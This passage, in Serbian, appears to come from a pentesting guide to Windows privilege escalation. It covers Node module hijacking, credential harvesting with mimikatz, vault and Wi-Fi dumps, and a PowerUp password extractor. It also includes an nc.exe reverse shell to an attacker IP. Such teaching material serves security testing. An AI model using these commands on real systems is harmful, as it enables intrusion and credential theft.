Node razrešava pakete tako što se kreće nagore kroz stablo direktorijuma i proverava foldere `node_modules` u svakom roditeljskom direktorijumu. U Windowsu, to kretanje može da stigne do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da pokuša da pronađe:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili direktorijum paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo postaje **LPE** svaki put kada se cilj pokreće kao administrator, iz zakazanog zadatka sa povišenim privilegijama/omotača servisa ili iz privilegovane desktop aplikacije koja se automatski pokreće.

Ovo je naročito često kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja sa radom u slučaju greške
- je paket uklonjen iz produkcionih verzija, izostavljen tokom pakovanja ili nije uspeo da se instalira
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, a ne u kodu glavne aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da potvrdite putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE Electron aplikacije ili proces omotača)
- Filtrirajte po `Path` koji `contains` `node_modules`
- Fokusirajte se na `NAME NOT FOUND` i poslednje uspešno otvaranje u `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte root direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Ubacite modul sa tačno očekivanim nazivom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionih modula iz stvarnog sveta koji odgovaraju ovom obrascu su `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo primeniti: pronađite bilo koji **nedostajući bare import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za otkrivanje i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili u njega upisuje nove `.js` datoteke/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciju uključite sve runtime zavisnosti i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana i potražite obrasce `try { require("...") } catch {}` koji ne prijavljuju greške.
- Onemogućite opcione provere ako ih biblioteka podržava (na primer, neke implementacije `ws` mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su drugi poznati računari hardkodirani u hosts datoteci.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite **ograničene usluge** spolja.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija pokrenuta pod nalogom sa višim privilegijama zaseban je predmet analize: listener i putanja binarne datoteke pasivni su tragovi, dok putanja do korupcije memorije koja zahteva autentifikaciju podrazumeva analizu baš te binarne datoteke i ulaza koji joj je dostupan. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite koja je pozadinska usluga u pitanju; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno niti ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall pravila

[**Pogledajte ovu stranicu za komande povezane sa Firewall-om**](../basic-cmd-for-pentesters.md#firewall) **(izlistavanje pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni fajl `bash.exe` može se pronaći i u putanji `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete da slušate na bilo kom portu (prvi put kada upotrebite `nc.exe` da sluša na portu, putem GUI-ja će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da pregledate `WSL` fajl sistem u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windowsu. Ako trenutni Windows identitet može da čita fajl sistem distribucije, pregledajte fajlove istorije shell-a (uključujući `/root/.bash_history`) i potražite komande koje su možda zabeležile akreditive; za eskalaciju je i dalje potreban važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično čuva distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), pa prvo utvrdite stvarnu distribuciju i putanju skladišta. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog prikupljanja podataka.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Vrednost `DefaultPassword` ili `AltDefaultPassword` koja nije prazna predstavlja nalaz u registru sa lozinkom u otvorenom tekstu. Ako je `AutoAdminLogon=1`, ali nijedna lozinka u otvorenom tekstu nije čitljiva, to je samo nagoveštaj: [Sysinternals Autologon može da čuva lozinku kao LSA tajnu](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registra ne potvrđuje da li ta tajna postoji ili može da se preuzme. Pre prijavljivanja izloženosti akreditiva proverite prava pristupa i stvarnu konfiguraciju prijavljivanja.

### Upravljač akreditivima / Windows vault

Preuzeto sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled može delovati kao da korisnici mogu da sačuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to nije način na koji funkcioniše.

Windows Vault čuva akreditive koje Windows može da koristi za automatsko prijavljivanje korisnika. To znači da svaka **Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da upotrebi dostavljene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za određeni resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa upravljačem akreditivima i zatraži akreditive za taj resurs** iz podrazumevanog vault-a za skladištenje.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na računaru.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete da koristite `runas` sa opcijom `/savecred` kako biste koristili sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl preko SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa datim akreditivima.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da se to može uraditi pomoću alata mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modula [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderne sistemske usluge čuvaju tokene za autentifikaciju i lozinke u čistom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` skladišta (dostupnog i kao `Web Credentials` u `vaultcmd`). Ovo skladište je izolovano po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Pokrenite ovu PowerShell komandu u aktivnoj sesiji korisnika da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u čistom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka i pretežno se koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi tajnu korisnika ili sistema kao značajan doprinos entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavljivanje**. U slučajevima kada se šifruje sistem, koristi tajne za autentifikaciju sistema na domenu.

Šifrovani korisnički RSA ključevi, zaštićeni pomoću DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [identifikator bezbednosti](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi zajedno s glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa njegov sadržaj nije moguće prikazati pomoću komande `dir` u CMD-u, ali se može prikazati kroz PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` uz odgovarajući `/masterkey` za dešifrovanje.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije, kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju do `.xml` datoteke. Kada skripta ili popis datoteka ukaže na njega, pronađite stvarni direktorijum profila naloga umesto da pretpostavite da je to `C:\Users`: [Windows može da postavi profile na drugu lokaciju](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka samo je trag; [Windows `Export-Clixml` povezuje šifrovani akreditiv sa korisnikom i računarom koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki pronađeni nalog mora zasebno imati važeća prava na predviđenoj usluzi. Prvo pregledajte putanje i ACL-ove, bez ispisivanja šifrovanih ili običnih vrednosti tokom uobičajenog popisivanja.

Da biste **dešifrovali** PowerShell akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač akreditivima za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul **Mimikatz** `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnoge DPAPI masterkeys iz memorije** pomoću modula Mimikatz `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i korisničkoj fascikli Documents, uključujući datoteke sa uobičajenim imenima kao što je `config.xml`. Utvrdite šemu veza i šifrovane atribute `Password` pre nego što XML datoteku smatrate tragom do kredencijala. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom široke enumeracije.

**Remote Desktop Plus profili za izvoz** mogu biti čitljivi i u korisničkim direktorijumima ili zajedničkoj administrativnoj fascikli. Nasleđeni izvoz `profiles.xml` sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Smatrajte neprazan element lozinke tragom do kredencijala, ali ga nemojte ispisivati niti pretpostavljati da je u čistom tekstu: [napomene proizvođača](https://www.donkz.nl/) navode da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili podešena sa manje strogim uslovima. Proverite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi često koriste aplikaciju Sticky Notes na Windows radnim stanicama da bi **sačuvali lozinke** i druge informacije, ne shvatajući da je u pitanju datoteka baze podataka. Ova datoteka se nalazi na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi pretražiti je i pregledati.

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili drugačije aplikacije mogu koristiti druge lokacije u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladištenja koristi pre nego što odsustvo SQLite datoteke protumačite kao odsustvo beleški.

Ako Sticky Notes koristi SQLite zapisivanje unapred (WAL), kopija same datoteke `plum.sqlite` možda neće sadržati nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` zajedno sa doslednom kopijom baze podataka i uključite `plum.sqlite-shm` ako je dostupna; indeks zajedničke memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite WAL dokumentaciju](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku predstavlja samo trag do kredencijala: posebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Za zapis šifrovanog password managera potreban je i stvarni ključ za dešifrovanje i tumačenje specifično za tu aplikaciju da bi se njime moglo potvrditi prijavljivanje sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga na nivou visokog integriteta.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **kredencijali** i da se mogu **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li postoji `C:\Windows\CCM\SCClient.exe`.\
Instaleri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i registar (akreditivi)

### Artefakti akreditiva u registru alata za podršku

Neke starije instalacije alata za udaljenu podršku zadržavaju nazive vrednosti povezane sa lozinkama u fiksnim ključevima registra aplikacije. Na primer, `SecurityPasswordAES` u TeamViewer-u označavao je konfigurisanu statičku lozinku sesije u verzijama pre 9, prema [objašnjenju proizvođača o ključu registra](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Oznaka u nazivu vrednosti samo je trag za proveru: pre procene akreditiva proverite instaliranu verziju, da li su podaci vrednosti čitljivi, format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog dodatno zahteva da se lozinka zaista ponovo koristi i da imate ovlašćenje za taj nalog. Šifrovani tekst i oporavljene lozinke ne uključujte u rutinski izlaz enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista kontroliše uređivanje i nije bezbednosna funkcija; ona sama po sebi ne znači da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene, relevantne datoteke i izbegavajte ispisivanje mogućih tajni tokom široke enumeracije. Čitljiva putanja do `.xlsx` datoteke, zaštićen list ili skrivena kolona sami po sebi ne dokazuju da akreditivi postoje ili da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Zadržane zakrpe izmena CI servera

CI server može zadržati poslate izmene izvornog koda u svom direktorijumu sa podacima i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kao skladište za izmene iz udaljenih pokretanja; direktorijum sa podacima može biti prilagodljiv i ne mora se nalaziti u `ProgramData`. Čitljiva zakrpa može sačuvati uklonjene ili dodate reference na datoteku sa akreditivima, ključ za šifrovanje ili skriptu koja koristi oba. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva AES ključ kao i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim, uz ovlašćenje, proverite relevantan sadržaj bez ispisivanja tajni u rutinskom izlazu enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju da je akreditiv važeći niti da omogućava pristup sa većim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte dodavanje tajni u izmene za izgradnju.

### Prilagođena rotacija lozinke lokalnog administratora

Samostalno napravljen rotator lozinki može čuvati šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, dok akreditive za skladište podataka drži u čitljivoj datoteci `.env` ili pored binarne datoteke programa za ažuriranje. Zajedno pregledajte zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, interfejs za slušanje i dozvole skladišta podataka. Skladište podataka dostupno samo preko loopback interfejsa i dalje je dostupno lokalnom korisniku sa važećim akreditivima, ali sama autentifikacija ne dokazuje da korisnik ima dozvolu da čita relevantne zapise. Ako su seme za šifrovanje ili ključni materijal dostupni pored šifrovanog teksta, pre nego što se pouzdate u šifrovanje proverite tačan postupak izvođenja ključa. Šema koja deterministički izvodi AES ključ iz izloženog semena pomoću Go-ovog [`math/rand`](https://pkg.go.dev/math/rand) nije prikladna za zaštitu te lozinke; Go navodi da taj paket nije prikladan za slučajnost osetljivu sa stanovišta bezbednosti. Pre nego što bilo koju oporavljenu lozinku smatrate putem za eskalaciju, potvrdite da je aktuelna i da pripada nalogu iz lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` datoteke ili šifrovani blob sami po sebi ne dokazuju nijedan od tih uslova. Lozinke i ključni materijal ne uključujte u rutinski izlaz enumeracije.

Koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) za upravljane lozinke lokalnog administratora. Njegovo skladištenje u direktorijumu ili usluzi Entra i kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [uloge Elasticsearch-a](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba akreditiva

Neki dodaci za Java servere distribuiraju se kao JAR arhive u direktorijumu servera `plugins`. Čitljiv prilagođeni dodatak može sadržati konfiguraciju ili bajtkod sa ugrađenim akreditivom usluge. Arhivu pregledajte samo uz ovlašćenje, a oporavljene tajne ne uključujte u rutinski izlaz enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a oporavljena lozinka usluge omogućava veće privilegije samo ako važi i za privilegovaniji nalog. Proverite ACL-ove relevantnih datoteka i zamenite ponovo korišćene akreditive zasebnim tajnama. Pogledajte [PaperMC vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/) za strukturu direktorijuma i [Oracle-ovu JAR dokumentaciju](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhiva.

### Akreditivi ugrađene baze podataka Openfire-a

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može čuvati `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da je čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. U [dokumentaciji Openfire-a o pružaocima korisničkih podataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) piše da lozinke mogu da se čuvaju u običnom tekstu ili da se šifruju ključem koji se nalazi u tom svojstvu. Oporavljena lozinka je važna za eskalaciju samo ako je i dalje važeća za identitet sa većim privilegijama; samo ime datoteke ne dokazuje ni pristup za čitanje ni ponovnu upotrebu akreditiva. Putanja služi kao trag za inventarisanje, zato sadržaj baze podataka i akreditive ne uključujte u rutinski izlaz enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može otkriti konfigurisane portove i interfejs za vezivanje admin konzole, čak i kada se koristi spoljna baza podataka. Openfire obično vezuje admin konzolu za loopback; lokalni nalog i dalje može da dosegne tu adresu ako je proces u stanju slušanja. Zajedno proverite stvarni proces koji sluša, ovlašćenu administratorsku ulogu, pravila otpremanja dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može izazvati pokretanje njegovog koda u kontekstu usluge, što može imati visoke privilegije ako se usluga pokreće kao LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja konfiguracije sami po sebi ne dokazuju pristup admin konzoli niti izvršavanje koda. Pogledajte proizvođačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija forenzičkog servera za upravljanje

Konfiguracije servera Velociraptor, koje se često zovu `server.config.yaml`, mogu sadržati `CA.private_key` internog CA-a. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda može da izda klijentski API sertifikat. Da li to omogućava veće privilegije zavisi od korisničkih uloga servera, dostupnosti API-ja i identiteta pod kojim se izvršavaju server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne dokazuje pristup CA-u servera. Neke instalacije drže privatni ključ CA-a van mreže, pa čitljiva konfiguracija servera možda nema ključ za potpisivanje.

